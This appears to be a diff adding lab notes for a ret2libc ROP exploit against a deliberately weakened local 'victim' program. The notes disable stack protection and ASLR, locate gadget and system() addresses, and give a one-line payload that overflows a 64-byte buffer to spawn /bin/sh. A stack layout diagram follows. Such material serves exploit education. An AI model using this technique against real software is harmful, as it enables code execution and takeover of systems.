@@ -1,0 +1,41 @@
+disable stackguard:
+# gcc -fno-stack-protector -o victim victim.c
+
+disable aslr:
+# echo 0 > /proc/sys/kernel/randomize_va_space 
+
+obtain buffer address:
+# ./victim
+
+obtain gadget address (offset from libc text base):
+# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi
+
+obtain libc text base:
+# cat /proc/pid/maps
+
+obtain system() address in libc:
+# nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
+
+buf= (from ./victim)
+libc= (from /proc/pid/maps)
+system= (from libc+nm)
+gadgets= (from libc+offset)
+sh= (from buf+64d+8d+24d=buf+96d)
+
+
+(((printf %0144d 0; printf %016x $gadgets | tac -rs..; printf %016x $sh | tac -rs..; printf %016x $system | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | ./victim
+
+
+#### Stack Layout ####
+    string /bin/sh
+----------------------
+    addr of system()
+----------------------
+    addr of /bin/sh
+----------------------
+ addr of pop rdi; ret
+----------------------
+     EBP Register
+----------------------
+     64 bytes buf
+######################
